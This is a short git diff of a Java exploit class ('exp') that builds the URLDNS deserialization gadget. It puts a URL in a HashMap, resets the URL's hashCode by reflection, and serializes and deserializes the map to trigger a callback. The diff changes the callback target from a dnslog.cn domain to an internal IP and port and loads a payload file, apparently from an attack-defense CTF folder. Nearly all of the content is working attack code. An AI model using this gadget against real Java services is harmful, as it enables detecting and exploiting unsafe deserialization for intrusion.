@@ -10,7 +10,7 @@ public class exp {
     public static void main(String[] args) throws Exception{
         HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();
         // 这里不要发起请求
-        URL url = new URL("http://pysnow.scz79h.dnslog.cn");
+        URL url = new URL("http://10.1.0.60:8085/");
         Class c = url.getClass();
         Field hashcodefile = c.getDeclaredField("hashCode");
         hashcodefile.setAccessible(true);
@@ -18,8 +18,8 @@ public class exp {
         hashmap.put(url,1);
         // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性
         hashcodefile.set(url,-1);
-//        serialize(hashmap);
-        unserialize("ser.bin");
+       // serialize(hashmap);
+        unserialize("D:/awd/exp/payload.bin");
 
     }
     public static void serialize(Object obj) throws IOException {
